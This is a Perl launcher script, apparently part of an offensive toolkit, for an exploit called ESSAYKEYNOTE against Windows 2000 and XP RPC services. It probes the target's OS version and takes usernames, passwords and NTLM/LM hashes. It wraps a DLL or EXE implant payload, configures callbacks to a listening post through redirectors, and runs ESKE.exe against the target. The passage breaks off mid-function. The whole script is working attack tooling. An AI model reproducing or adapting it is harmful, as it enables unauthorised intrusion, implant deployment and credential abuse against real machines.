

use strict;
use vars qw($VERSION);

$::VERSION = "ESSAYKEYNOTE Script: 1.6.2";
print "\n\n$::VERSION\n\n";



use FindBin;				
use lib "$FindBin::Bin";	
use Getopt::Long;			
use Cwd;					

use lib "$FindBin::Bin\\..\\..\\Resources\\Perl";
use ExploitUtils qw(
	$EU_LOGFILE
	$EU_VERBOSE
	$EU_BATCHMODE
	EU_LogInit
	EU_Log
	EU_ExitMessage
	EU_GetInput
	EU_GetExistingDir
	EU_GetIP
	EU_GetLocalIP
	EU_GetRootDir
	EU_GetPort
	EU_RunCommand
	EU_GetAddr
);


use vars qw($RIDEAREA $PAYLOAD_DLL $PAYLOAD_EXE $EXPLOIT_EXE @DEPFILES);

my	%opts = ();
GetOptions(\%opts, "v", "h", "q|?", "b", "e=s", "f=s", "d=s", "t=s", "l=s", "c=s", "x=s", "n=s") or &print_script_usage(0);

if (scalar(@ARGV) > 0 ) {
  &EU_Log(1, "Extraneous arguments found on command line: @ARGV");
  &EU_Log(1, "Arguments will be ingnored");
  while(@ARGV) {shift;}
}

if (!defined($opts{"e"})) {
	&EU_Log(1, "A -e option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"f"})) {
	&EU_Log(1, "A -f option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"x"})) {
	&EU_Log(1, "A -x option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"l"})) {
	&EU_Log(1, "A -l option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"n"})) {
	&EU_Log(1, "A -n option must be supplied.");
	&print_usage(0);
}

$::RIDEAREA		= "Resources\\Tools\\ridearea2.exe";	
$::RPCTOUCHII	= "Resources\\Tools\\rpc2.exe";			

$::LP_DLL	= "$opts{l}";					
$::PAYLOAD_DLL	= "$opts{f}";				
$::PAYLOAD_EXE	= "$opts{x}";				
$::PAYLOAD_EXE_NAME = "$opts{n}";			
$::EXPLOIT_EXE	= "$opts{e}\\ESKE.exe";					

$::EGG_SOCKET_NONE			= "1";			
$::EGG_SOCKET_NEW			= "2";			
$::EGG_SOCKET_REUSE			= "3";			

$::IMPLANT_SOCKET_NEW		= "2";			
$::IMPLANT_SOCKET_MAINTAIN	= "3";			

$::RUN_EXPLOIT				= "1";			
$::RUN_PROBE_1				= "2";			
$::RUN_PROBE_2				= "3";			
$::RUN_PROBE_3				= "4" ;
$::RUN_PROBE_4				= "5" ;

$::OS_VER_UNKNOWN	= "UNKNOWN";
$::OS_VER_2K		= "Windows 2000";
$::OS_VER_XP		= "Windows XP";


$::SP_VER_01		= 1;
$::SP_VER_2	= 2;



$::TARGET_VER_UNKNOWN	= -1;
$::TARGET_VER_2K		= 3;
$::TARGET_VER_XP		= 4;

$::ESSAYKEYNOTE_NAMED_PIPE_ENDPOINT = 2;
$::ESSAYKEYNOTE_TCP_ENDPOINT = 1;


 



my $work_dir       = $opts{"d"} if (defined $opts{"d"});
my $root_dir       = $opts{"c"} if (defined $opts{"c"});
my $TargetIpIn      = $opts{"t"} if (defined $opts{"t"});


@DEPFILES = ($::RIDEAREA, $::EXPLOIT_EXE);


my	$logfile_prefix		= "ESKE_";			
my	$logfile_suffix		= "_script.log";	
my	$filename_suffix	= "_payload.bin";	

my	$TargetIp			= $TargetIpIn;		
my	$TargetPort			= 0;				
my	$ImplantSocketStatus= $::IMPLANT_SOCKET_NEW;	
my	$TimeOutValue		= 0;				

my	$PayloadFile		= "";				
my	$PayloadType		= "";				
my	$PayloadDropName	= "N/A";			

my	$EggSocketStatus	= $::EGG_SOCKET_REUSE;	
my  $EggCallbackIp			= "127.0.0.1";		
my  $EggCallbackPort		= 0;				

my	$ExternalRideArea	= 0;				
my	$RA_Payload			= "N/A";

my $TransProt_none		=0;
my $TransProt_tcp		=1;
my $TransProt_udp		=2;
my $TargetTransportProtocol	= $TransProt_none;		
my $TransportProtocol = "undefined";

my $AppProt_none	= 0;
my $AppProt_NA		= 1;
my $AppProt_nbt		= 2;
my $AppProt_smb		= 3;
my $AppProt_smtp	= 4;
my $AppProt_pop		= 5;
my $AppProt_http	= 6;
my $AppProt_ftp		= 7;
my $AppProt_telnet	= 8;
my $AppProt_imap	= 9;
my $TargetApplicationProtocol = $AppProt_none;				
my $ApplicationProtocol	= "undefined";	

my $RpcConnection =  "";									


my $RPCTOUCHII_RUN_GENERAL_PROBE			= 1;
my $RPCTOUCHII_RUN_REGPROBE					= 2;
my $RPCTOUCHII_RUN_XP_SP0_PROBE	            = 3; 
my $RPCTOUCHII_RUN_RPC_INTERFACE_PORT       = 4;
my $RPCTOUCHII_RUN_WINDOWS_2000_SP4_PROBE	= 5;
my $RPCTOUCHII_RUN_KB823980_PROBE           = 6; 
my $RPCTOUCHII_RUN_KB824146_PROBE			= 7; 
my $RPCTOUCHII_RUN_WINDOWS_2003_PROBE		= 8; 




my	$WindowsVersion		= 0;				
my  $WindowsServicePack = -1;				
my	$Domain				= "NULL";			
my  $Username			= "NULL";			
my  $Password			= "NULL";			
my $NTHash = "00000000000000000000000000000000"; 
my $LMHash = "00000000000000000000000000000000";


my  $IPID				="00112233445566778899aabbccddeeff";
my	$RpcServerIp		= 0;				


&print_usage(1) if (defined $opts{"h"});	
&print_usage(0) if (defined $opts{"q"});	

$ExploitUtils::EU_VERBOSE   = 1 if (defined $opts{"v"});	
$ExploitUtils::EU_BATCHMODE = 1 if (defined $opts{"b"});	



if ($ENV{"OS"} ne "Windows_NT") {
    &EU_ExitMessage(1,"This script requires Windows NT or Windows 2000");
}


$work_dir = &EU_GetExistingDir("Enter pathname for operation's working directory", $work_dir, 1);
$root_dir = &EU_GetRootDir($root_dir,@::DEPFILES);



&EU_LogInit($logfile_prefix, $logfile_suffix, $work_dir);
&EU_Log(0,"$::VERSION");



&EU_Log(0,"\nChanging to working directory: $work_dir");
chdir $work_dir || &EU_ExitMessage(1,"Unable to change to working directory: $work_dir");



($TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
 $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection,
 $EggCallbackIp, $EggCallbackPort, $Username, $Password,$NTHash, $LMHash,$ExternalRideArea, $IPID, 
 $WindowsVersion, $WindowsServicePack, $RpcServerIp) =
	&validate_parms($work_dir, $root_dir, $TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName,
	$TimeOutValue, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, 
	$EggCallbackIp, $EggCallbackPort, $Username, $Password, $NTHash, $LMHash,$ExternalRideArea, $IPID, $WindowsVersion, $WindowsServicePack, $RpcServerIp);

my $answer;
if(!$EU_BATCHMODE) {
	$answer = &EU_GetInput("\nReady to begin exploit ([y],n,quit)? ", "y");
	&EU_ExitMessage(0,"User terminated script")  if ($answer ne "y" and $answer ne "Y");
}


if ($ExternalRideArea == 1) {


	my $payload_name_format = "${work_dir}\\${logfile_prefix}%04d%02d%02d_%02d%02d%02d${filename_suffix}"; 
	my ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = gmtime(time);

	$year += 1900;
	$mon  += 1;

	$RA_Payload = sprintf($payload_name_format,$year,$mon,$mday,$hour,$min,$sec);


	if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
		if ($PayloadDropName eq "N/A") {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m");
			}
		}
		else {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");	
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m");	
			}
		}
	}
	elsif( $ImplantSocketStatus eq $::IMPLANT_SOCKET_NEW ) {
		if ($PayloadDropName eq "N/A") {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 13 -a 3 -t m -l m");
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 13 -a 3 -t m");
			}
		}
		else {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 13 -a 3 -t m -l m");	
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 13 -a 3 -t m");	
			}
		}
	}
}



my $flags;
if($ExploitUtils::EU_VERBOSE) { $flags = "-v"; }
else { $flags = ""; }

&EU_Log(1,"\nExploit will launch in a separate window. Follow the status messages");
&EU_Log(1,"in the new window to determine if it succeeds.");
&EU_Log(1,"\nLaunching exploit...");


my $ImplantPayload = "N/A";
if ($ExternalRideArea == 1) {
	$ImplantPayload = $RA_Payload;
}
else {
	$ImplantPayload = $PayloadFile;
}

if ($ExternalRideArea == 1) {
	&EU_RunCommand("start \"ESKE Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_EXPLOIT	-i $TargetIp -p $TargetPort -u $EggSocketStatus -c $ImplantSocketStatus -I $EggCallbackIp -P $EggCallbackPort	-f \"$ImplantPayload\" -l \"$root_dir\\$::LP_DLL\" -z -o $TimeOutValue -t $TargetTransportProtocol -b $TargetApplicationProtocol $RpcConnection -w $WindowsVersion -D $IPID -h $RpcServerIp  -w $WindowsVersion -M $Domain -U $Username -W $Password -N $NTHash -L $LMHash -S $WindowsServicePack\"");
}
else {
	if ($PayloadDropName eq "N/A") {
		&EU_RunCommand("start \"ESKE Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_EXPLOIT	-i $TargetIp -p $TargetPort -u $EggSocketStatus -c $ImplantSocketStatus -I $EggCallbackIp -P $EggCallbackPort	-f \"$ImplantPayload\" -x $PayloadType -l \"$root_dir\\$::LP_DLL\" -o $TimeOutValue -t $TargetTransportProtocol -b $TargetApplicationProtocol $RpcConnection -w $WindowsVersion -D $IPID -h $RpcServerIp -w $WindowsVersion -M $Domain -U $Username -W $Password -N $NTHash -L $LMHash -S $WindowsServicePack\"");
	}
	else {
		&EU_RunCommand("start \"ESKE Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_EXPLOIT	-i $TargetIp -p $TargetPort -u $EggSocketStatus -c $ImplantSocketStatus -I $EggCallbackIp -P $EggCallbackPort	-f \"$ImplantPayload\" -x $PayloadType -q $PayloadDropName -l \"$root_dir\\$::LP_DLL\" -o $TimeOutValue -t $TargetTransportProtocol -b $TargetApplicationProtocol $RpcConnection -w $WindowsVersion -D $IPID -h $RpcServerIp -w $WindowsVersion -M $Domain -U $Username -W $Password -N $NTHash -L $LMHash -S $WindowsServicePack\"");
	}
}



my $cur_dir = cwd();
chdir $cur_dir || &EU_ExitMessage(1,"Unable to switch back to initial directory: $cur_dir");

&EU_ExitMessage(0,"\nDone with $::0.");



sub print_usage() {
	my ($verbose) = @_;
	print "$::VERSION\n";

	print qq~
Usage: $::0 [-v] [-h] [-?] [-b]
             [-d <working directory>] [-e <exploits directory>]
			 [-t <target IP>] [-l <lp dll>]
             [-f <payload dll>] 
			 [-x <payload exe> [-n <Payload Dropname>]]
	 
~;

	if ($verbose) {
		print qq~

  -v                    verbose mode. Default non-verbose mode.

  -h                    Print this help information.

  -?                    Print abbreviated help information.

  -b                    Batch (non-interactive) mode. Default interactive mode.

  -d <working directory> Working Directory
                        Top-level directory where operation's files will be
                        generated. Default E:\.

  -e <exploits directory> Exploits Directory
                        Top-level directory containing exploit files.
						Default one directory up from directory containing this script.

  -t <target IP>        Target IP address.
                        Default derived as last part of working directory name.
  
  -l <lp dll>           Filename of the listening post dll.

  -f <payload dll>      Filename of the implant payload (dll).

  -x <payload exe>      Filename of the implant payload (exe).

  -n <payload dropname> Filename to be used for the dropped executable 

~;
	}

	&EU_ExitMessage(1,"End of help.");
}


sub validate_parms() {
	my ($work_dir, $root_dir, $TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, 
		$PayloadType, $PayloadDropName,
		$TimeOutValue,$TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection,
		 $EggCallbackIp, $EggCallbackPort, $Username, $Password,$NTHash, $LMHash,$ExternalRideArea,$IPID, 
		 $WindowsVersion,$WindowsServicePack,$RpcServerIp) = @_;

	my ($continue, $retcode, $vol, $dir);
	my ($redirectFlag);
	my $OrgTargetIp			= $TargetIp;
	my $LPRedirectionIp		= "127.0.0.1";
	my $LPRedirectionPort	= "undefined";
	my $DestinationIp		= $TargetIp;
	my $DestinationPort		= "undefined";
	my $TransportProtocolSelected = 0;
	my $EndpointSelected = 0;
	my $RideAreaOpt			= "Exploit called";
	my $UsingPassword				= 0;
;	my $OriginalTargetTransportProtocol = 0;
;	my $OriginalTargetApplicationProtocol = 0;

	my ($LocalIp);
	my $attackPort = 0;
	my $attackPort2 = 0;
	my $TargetPort2 = 0;

	my  $EndPoint			= 	$::ESSAYKEYNOTE_TCP_ENDPOINT; 

	my $EnterCallbackIp		= "Enter the call-back IP Address";
	my $EnterCallbackPort	= "Enter the call-back Port";
	my  $IPID_tch2				="00112233445566778899aabbccddeeff";



	my $w2k			= "Windows 2000";
	my $wxp			= "Windows XP";


	$LocalIp = &EU_GetLocalIP("Enter the local IP Address", $LocalIp);
	&EU_Log(0, "Enter the local IP Address:  $LocalIp");
	while (1) {



		&EU_Log(1,"\nSelect Payload file to send:\n");
		&EU_Log(1,"   0) $::PAYLOAD_DLL");		
		&EU_Log(1,"   1) $::PAYLOAD_EXE ($::PAYLOAD_EXE_NAME)");		
		while(1) {
			$retcode = &EU_GetInput("\nEnter selection [0]: ", "0");
			&EU_Log(0, "\nEnter selection [0]: $retcode");

			if($retcode eq "0") {
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_DLL\n");
				$PayloadFile = $::PAYLOAD_DLL;
				$PayloadType = "d";
				$PayloadDropName = "N/A";
			}
			elsif($retcode eq "1") { 
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_EXE\n");
				$PayloadFile = $::PAYLOAD_EXE;
				$PayloadType = "e";
				$PayloadDropName = $::PAYLOAD_EXE_NAME;
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} 



		&EU_Log(1,"\nRideArea option:\n");
		&EU_Log(1,"   0) Have exploit call RideArea [DEFAULT]");		
		&EU_Log(1,"   1) Have the script call RideArea.  (RideArea is newer than the exploit)");		
		while(1) {
			$ExternalRideArea = &EU_GetInput("\nEnter selection [0]: ", $ExternalRideArea);
			&EU_Log(0, "\nEnter selection [0]: $ExternalRideArea");

			if($ExternalRideArea eq "0") {
				$RideAreaOpt = "Exploit called";
			}
			elsif($ExternalRideArea eq  "1") { 
				$RideAreaOpt = "Script called";
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} 


		&EU_Log(1,"\nSelect the Transport Protocol Sequence To Use:\n");
		&EU_Log(1,"(NOTE: This is only for the initial connection to the System Activation Service.The actual exploit may be different.)\n");
		&EU_Log(1,"   1) TCP/IP (TCP Port 135 is accessible) [DEFAULT]");
		&EU_Log(1,"   2) NBT/Named Pipe (TCP Port 139 is accessible)");
		&EU_Log(1,"   3) SMB/Named Pipe (TCP Port 445 is accessible)");
		while(1) {
			$TransportProtocolSelected = &EU_GetInput("\nEnter selection [1]: ", "1");
			&EU_Log(0, "\nEnter selection [1]: $TransportProtocolSelected");
			if ($TransportProtocolSelected eq "1") {
				$TargetTransportProtocol	= $TransProt_tcp;
				$TransportProtocol			= "tcp";
				$TargetApplicationProtocol	= $AppProt_NA;
				$ApplicationProtocol		= "NA";
				$RpcConnection				= "-rpc";
				$DestinationPort			= 135;
			}
			elsif($TransportProtocolSelected eq "2") {
				$TargetTransportProtocol	= $TransProt_tcp;
				$TransportProtocol			= "tcp";
				$TargetApplicationProtocol	= $AppProt_nbt;
				$ApplicationProtocol		= "nbt";
				$RpcConnection				= "-rpc";
				$DestinationPort			= 139;
			}
			elsif($TransportProtocolSelected eq "3") {
				$TargetTransportProtocol	= $TransProt_tcp;
				$TransportProtocol			= "tcp";
				$TargetApplicationProtocol	= $AppProt_smb;
				$ApplicationProtocol		= "smb";
				$RpcConnection				= "-rpc";
				$DestinationPort			= 445;
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
				}
			last;
		}  


		($Username, $Password, $NTHash, $LMHash, $UsingPassword) = &get_auth($Username, $Password, $NTHash, $LMHash, $UsingPassword);

		$retcode = &EU_GetInput("\nWill this operation be REDIRECTED ([y],n)? ", "y");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) { $redirectFlag = 1; }
		else { $redirectFlag = 0; }



		if( $redirectFlag == 0 ) {


			$EggCallbackIp = $LocalIp;
			$TargetIp = $OrgTargetIp;  
			$TargetIp = &EU_GetIP("\nEnter the target IP Address", $TargetIp);
			&EU_Log(0, "\nEnter the target IP Address:  $TargetIp");
			$DestinationIp = $TargetIp;

			$DestinationPort = &EU_GetPort("\nEnter the target Port", $DestinationPort);
			&EU_Log(0, "\nEnter the target Port:  $DestinationPort");

			$TargetPort = $DestinationPort;


			$RpcServerIp = $TargetIp;





			if($DestinationPort < 6500)
			{
				$EggCallbackPort = $DestinationPort * 10 + 1;
			}
			else
			{
				$EggCallbackPort = $DestinationPort + 11;
			}
			($ImplantSocketStatus, $EggSocketStatus) = 
				&get_socket_options($ImplantSocketStatus, $EggSocketStatus, 
				                    $PayloadType);

			if( $EggSocketStatus eq $::EGG_SOCKET_NEW) 
			{
				&EU_Log(1, "The local IP Address should be used as the Egg call-back IP ".
				           "Address.");

				$EggCallbackIp = &EU_GetLocalIP("\n$EnterCallbackIp", $LocalIp);
				&EU_Log(0, "\n$EnterCallbackIp:  $EggCallbackIp");

				$EggCallbackPort = &EU_GetPort("\n$EnterCallbackPort", $EggCallbackPort);
				&EU_Log(0, "\n$EnterCallbackIp:  $EggCallbackPort");
			}

		}

		else {


			$LPRedirectionIp = &EU_GetIP("\nEnter the LP Redirection IP address", $LPRedirectionIp);
			&EU_Log(0, "\nEnter the LP Redirection IP address:  $LPRedirectionIp");
			$TargetIp = $LPRedirectionIp;

			if($DestinationPort < 6500)
			{
				$LPRedirectionPort = $DestinationPort * 10;
			}
			else
			{
				$LPRedirectionPort = $DestinationPort + 10;
			}

			$LPRedirectionPort = &EU_GetPort("DestinationPort: $DestinationPort.  Enter the LP Redirection Port", $LPRedirectionPort);
			&EU_Log(0,"\nDestinationPort: $DestinationPort.  Enter the LP Redirection Port: $LPRedirectionPort");
			$TargetPort = $LPRedirectionPort;


			$RpcServerIp = &EU_GetIP("\nEnter the RPC Server's IP Address\n(AKA: the ".
			                         "Actual Target's IP Address)", $TargetIp);
			&EU_Log(0, "\nEnter the RPC Server's IP Address\n(AKA: the Actual Target's ".
			           "IP Address):  $RpcServerIp");




			$EggCallbackPort = $DestinationPort * 10 + 1;

			($ImplantSocketStatus, $EggSocketStatus) = 
				&get_socket_options($ImplantSocketStatus, $EggSocketStatus, 
				                    $PayloadType);

			if( $EggSocketStatus eq $::EGG_SOCKET_NEW) 
			{
				&EU_Log(1, "\nThe call-back IP Address MUST be that of the Redirector. ".
				           " The call-back Port MUST be the same number on both the ".
						   "Redirector and the local machine, else redirection will fail.".
						   "  The local machine uses this port to listen for the call-back,".
						   " and the ESKE Exploit Payload uses it to call-back to the ".
						   "Redirector.");

				$EggCallbackIp = &EU_GetIP("\n$EnterCallbackIp");
				&EU_Log(0, "\n$EnterCallbackIp:  $EggCallbackIp");

				$EggCallbackPort = &EU_GetPort("\n$EnterCallbackPort", $EggCallbackPort);
				&EU_Log(0, "\n$EnterCallbackIp:  $EggCallbackPort");
			}

		}  



		&EU_Log(1, "\nThe default time-out value for the target connection is 60 sec.");
		&EU_Log(1, "(You may want to increase this value if the network is exceptionally slow.)");
		$retcode = &EU_GetInput("Use default value of 60 sec ([y],n)? ", "y");
		&EU_Log(0, "Use default value of 60 sec ([y],n)?  $retcode");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") or ($retcode eq "60") ) {
			$TimeOutValue = "60";
		}
		else {
			$TimeOutValue = &EU_GetInput("Enter new time-out value (greater than 60): ");
			&EU_Log(0, "Enter new time-out value (greater than 60):  $TimeOutValue");
		}



		&EU_Log(1,"\nConfirm Network Parameters:");
		&EU_Log(1,"\tRoot Directory        : $root_dir");
		&EU_Log(1,"\tLocal IP              : $LocalIp");
		&EU_Log(1,"\tPayload file          : $PayloadFile");
		&EU_Log(1,"\tPayload drop name     : $PayloadDropName");
		&EU_Log(1,"\tRideArea Option       : $RideAreaOpt");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection     : True");
			&EU_Log(1,"\tLP Redirector IP      : $LPRedirectionIp");
			&EU_Log(1,"\tLP Redirector Port    : $LPRedirectionPort");
		}
		else {
			&EU_Log(1,"\tUsing Redirection     : False");
		}
			&EU_Log(1,"\tTarget IP             : $DestinationIp");
			&EU_Log(1,"\tTarget Port           : $DestinationPort");
			&EU_Log(1,"\tRPC Server IP         : $RpcServerIp");

		if( $EggSocketStatus eq $::EGG_SOCKET_NEW ) {
			&EU_Log(1,"\tEgg Socket Status     : New");
			if( $redirectFlag ) {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp (Middle Redirector)");
			}
			else {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp");
			}
			&EU_Log(1,"\tEgg Callback Port     : $EggCallbackPort");
		}
		elsif( $EggSocketStatus eq $::EGG_SOCKET_REUSE ) {
			&EU_Log(1,"\tEgg Socket Status     : Reuse");
		}
		else {
			&EU_Log(1,"\tEgg Socket Status     : None");
		}

		if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
			&EU_Log(1,"\tExploit Socket Status : Maintain (Use existing connection for the entire operation.)");
		}
		else {
			&EU_Log(1,"\tExploit Socket Status : Close (Existing connection will NOT be used for the entire operation.)");
		}


		&EU_Log(1,"\tTransport Protocol    : $TransportProtocol");
		&EU_Log(1,"\tApplication Protocol  : $ApplicationProtocol");
		&EU_Log(1,"\tRpc Connection flag   : $RpcConnection");
		if($UsingPassword == 1)
		{
			&EU_Log(1,"\tDomain                : $Domain");
			&EU_Log(1,"\tUsername              : $Username");
			&EU_Log(1,"\tPassword              : $Password");
		}

		if($UsingPassword == 2)
		{
			&EU_Log(1,"\tDomain                : $Domain");
			&EU_Log(1,"\tUsername              : $Username");
			&EU_Log(1,"\tNTLM password hash    : $NTHash");
			&EU_Log(1,"\tLANMAN password hash  : $LMHash");
		}

		&EU_Log(1,"\tNetwork Time Out      : $TimeOutValue sec");


		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
			; 
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}



		my $probeFlag = "n";			
		$WindowsVersion = $::TARGET_VER_UNKNOWN;			

		&EU_Log(1, "\n\nRecall that ESSAYKEYNOTE can only exploit Window 2000 and XP SP0,SP1 boxes anonymously.  \nExploitation of XPSP2 requires an administrative password.");

		$probeFlag = &EU_GetInput("\nUse RPCTOUCH to obtain the Windows Version ([y],n)? ", "y");

		if(($probeFlag eq "y") or ($probeFlag eq "Y")) {
			my $probeError;


			($WindowsVersion, $WindowsServicePack, $probeError) = &launch_rpctouchii($root_dir,$TargetIp,$TargetPort, $RPCTOUCHII_RUN_GENERAL_PROBE, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcServerIp, $TimeOutValue, $WindowsVersion, $WindowsServicePack);

			
			if( ($WindowsVersion == $::TARGET_VER_XP) and ($probeError == 0) and ($ApplicationProtocol eq "NA")and ($WindowsServicePack != 2)) 
			{
				($WindowsVersion, $WindowsServicePack, $probeError) = &launch_rpctouchii($root_dir,$TargetIp,$TargetPort, $RPCTOUCHII_RUN_WINDOWS_2003_PROBE, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcServerIp, $TimeOutValue);
			}
			elsif(($WindowsVersion == $::TARGET_VER_XP) and ($probeError == 0) and ($WindowsServicePack != 2))
			{
				($WindowsVersion, $WindowsServicePack, $probeError) = &touch_tool($root_dir,$TargetIp,$TargetPort, $::RUN_PROBE_4, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcServerIp, $TimeOutValue, $WindowsVersion,$WindowsServicePack, $Domain, $Username, $Password, $NTHash, $LMHash, $attackPort, $EndPoint);
			}

			if( ($probeError == 1) or ($WindowsVersion eq $::TARGET_VER_UNKNOWN) ) {


				&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
				$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
				&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");

				if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
					&EU_ExitMessage(1,"User terminated script\n");
				}
				elsif( ($continue eq "n") or ($continue eq "N") ) {
					&EU_Log(1, "Returning to top of script...\n");
					next;
				}
				else { 
					$probeFlag = "N";
				}

			}
			
		} 


			
		&EU_Log(1,"\nSelect the target Windows Version:\n");
		
		&EU_Log(1,"   0) $::OS_VER_2K");		
		&EU_Log(1,"   1) $::OS_VER_XP Service Pack 0 or 1");		
		&EU_Log(1,"   2) $::OS_VER_XP Service Pack 2");	
		
		my $recommended_choice = -1;

		if($WindowsVersion == $::TARGET_VER_2K)
		{
			$recommended_choice = 0;
		}
		elsif($WindowsVersion == $::TARGET_VER_XP &&  $WindowsServicePack == $::SP_VER_01)
		{
			$recommended_choice = 1;
		}
		elsif($WindowsVersion == $::TARGET_VER_XP && $WindowsServicePack == $::SP_VER_2)
		{
			$recommended_choice = 2;
		}


		while(1) 
		{
			$retcode = &EU_GetInput("\nEnter selection : [$recommended_choice] ", $recommended_choice );
			&EU_Log(0, "\nEnter selection : $retcode");
			if($retcode == 0) 
			{
				$WindowsVersion = $::TARGET_VER_2K; 	
				&EU_Log(0,"\tWindowsVersion      : $::OS_VER_2K");
			}
			elsif($retcode == 1) 
			{
				$WindowsVersion = $::TARGET_VER_XP;
				$WindowsServicePack = $::SP_VER_01;
				&EU_Log(0,"\tWindowsVersion      : $::OS_VER_XP");
				&EU_Log(0,"\tWindowsServicePack      : $::SP_VER_01");

			}
			elsif($retcode == 2) 
			{
				$WindowsVersion = $::TARGET_VER_XP;
				$WindowsServicePack = $::SP_VER_2;
				&EU_Log(0,"\tWindowsVersion      : $::OS_VER_XP");
				&EU_Log(0,"\tWindowsServicePack      : $::SP_VER_2");

				if ($Username eq "NULL" and $Password eq "NULL")
				{
					&EU_Log(1, "\n*** WARNING *** XP Service pack 2 targets require an administrative username and password.");
					$UsingPassword = "1";
					($Username, $Password, $NTHash, $LMHash, $UsingPassword) = &get_auth($Username, $Password, $NTHash, $LMHash, $UsingPassword);
				}
				if ($Username eq "NULL" and $Password eq "NULL")
				{
					$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
					&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");

					if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) 
					{
						&EU_ExitMessage(1,"User terminated script\n");
					}
					elsif( ($continue eq "n") or ($continue eq "N") ) 
					{
						&EU_Log(1, "Returning to top of script...\n");
						last;
					}
					else 
					{ 
						
					}
				}

			}

			else 
			{
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
						
		}
		if(($continue eq "n") or ($continue eq "N") )
		{
			next;
		}

		&EU_Log(1,"\n\nSelect Endpoint option (THIS IS THE ENDPOINT FOR THE ACTUAL EXPLOIT):\n");
		&EU_Log(1,"   0) Ephemeral TCP port [DEFAULT]");
		if( ($WindowsVersion == $::TARGET_VER_XP) and ($WindowsServicePack != $::SP_VER_2))
		{		
			&EU_Log(1,"   1) NBT/Named Pipe (TCP Port 139) *** ONLY WORKS AGAINST XP TARGETS SP < 2");
			&EU_Log(1,"   2) SMB/Named Pipe (TCP Port 445) *** ONLY WORKS AGAINST XP TARGETS SP < 2");
		}
		while(1) 
		{
			$EndpointSelected = &EU_GetInput("\nEnter selection [$EndpointSelected]: ", $EndpointSelected);
			&EU_Log(0, "\nEnter selection [0]: $EndpointSelected");

			if($EndpointSelected eq  "0")
			{
				$EndPoint = $::ESSAYKEYNOTE_TCP_ENDPOINT; 
			}
			elsif($EndpointSelected eq  "1")
			{ 
				if($WindowsVersion == $::TARGET_VER_XP)
				{
